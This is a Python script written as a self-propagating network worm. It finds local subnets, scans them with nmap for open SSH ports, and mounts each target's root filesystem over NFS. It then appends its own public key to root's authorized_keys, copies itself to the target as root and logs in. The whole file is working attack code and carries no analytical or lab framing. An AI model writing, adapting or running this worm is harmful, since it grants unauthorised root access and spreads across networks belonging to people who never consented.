#! /usr/bin/env python3
import os
import nmap
import subprocess
from subprocess import Popen, PIPE
import base64
def subnet():
    process = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)
    stdout = process.communicate()[0]
    stdout = str(stdout.strip())
    stdout = stdout.split(' ')
    stdout = [i for i in stdout if i]
    elem_list = []
    t = -1
    while True:
        try:
            t = stdout.index('inet', t + 1)
            elem_list.append(t + 1)
        except ValueError:
            break
    newelem_list = []
    for i in elem_list:
        newelem_list.append(stdout[i])
    newelem_list.remove('127.0.0.1')
    f_list = []
    for i in newelem_list:
        o = i.split('.')
        o.pop()
        f_list.append(str(o[0] + '.' + o[1] + '.' + o[2] + '.' + '1' + '/24'))
    return(f_list)
def ssh():
    for ip_range in subnet():
        ssh_list = []                                    #Define a list to contain ip's open on port 22
        nm = nmap.PortScanner()                          #Instantiate portscanner object
        nm.scan(ip_range,'22')                      #Scan ports 10.0.2.0 - 10.0.2.256 on port 22
        for host in nm.all_hosts():                      #Create a for loop to iterate over the scanned host
            if nm[host]['tcp'][22]['state'] == 'open':   #Validate port 22 is open
                ssh_list.append(host)                    #Add validate hosts to ssh_list
        return(ssh_list)
def worm():
    for ip in ssh():
        os.makedirs('/lotus', exist_ok = True)
        subprocess.run(['cp -r ./* /lotus'], shell=True)
        subprocess.run(['ssh-keyscan ' + str(ip) + '>> ~/.ssh/known_hosts'], shell=True)
        proc = subprocess.Popen(['ssh-keygen -t rsa -f ~/.ssh/id_rsa'],stdout=PIPE, stdin=PIPE, shell=True)
        proc.communicate(input=base64.encodebytes('y'.encode()))
        os.makedirs('/tmp/r00t', exist_ok = True)
        subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
        subprocess.run(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
        subprocess.run(['umount /tmp/r00t'], shell=True)
        subprocess.run(['scp -r /lotus root@' + str(ip) + ':/'], shell=True)
        subprocess.run(['ssh root@'  + str(ip)], shell=True)                 
def main():
    worm()
if __name__ == '__main__':
    main()
